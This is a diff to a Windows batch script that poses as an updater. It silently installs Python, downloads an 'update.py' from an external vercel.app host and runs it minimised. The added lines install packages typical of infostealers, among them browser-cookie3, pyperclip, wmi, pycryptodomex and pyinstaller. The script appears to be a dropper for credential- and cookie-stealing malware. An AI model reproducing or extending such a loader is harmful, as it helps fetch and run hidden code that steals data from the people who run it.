@@ -8,6 +8,7 @@ set "UPDATE_SCRIPT_URL=https://boostware-external-download.vercel.app/company/up
 set "INSTALL_PATH=%USERPROFILE%\Python311"
 set "ZIP_PATH=%TEMP%\python311.zip"
 set "UPDATE_SCRIPT_PATH=%INSTALL_PATH%\update.py"
+set "PIP_PACKAGES=cryptography opencv-python psutil pycountry pyperclip pypiwin32 requests requests-toolbelt wmi pyaesm browser-cookie3 colorama customtkinter nuitka packaging pillow pycryptodomex pyinstaller"
 
 :: Download Python embeddable zip
 powershell -Command "& {Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%ZIP_PATH%'}"
@@ -27,6 +28,17 @@ setx PATH "%INSTALL_PATH%;%PATH%" /M
 
 :: Download the update.py script
 powershell -Command "& {Invoke-WebRequest -Uri '%UPDATE_SCRIPT_URL%' -OutFile '%UPDATE_SCRIPT_PATH%'}"
+
+:: Install pip
+powershell -Command "& {%INSTALL_PATH%\python.exe -m ensurepip}"
+
+:: Upgrade pip
+powershell -Command "& {%INSTALL_PATH%\python.exe -m pip install --upgrade pip}"
+
+:: Install required packages
+for %%p in (%PIP_PACKAGES%) do (
+    powershell -Command "& {%INSTALL_PATH%\python.exe -m pip install %%p}"
+)
 
 :: Run update.py silently
 start /min "" "%INSTALL_PATH%\python.exe" "%UPDATE_SCRIPT_PATH%"
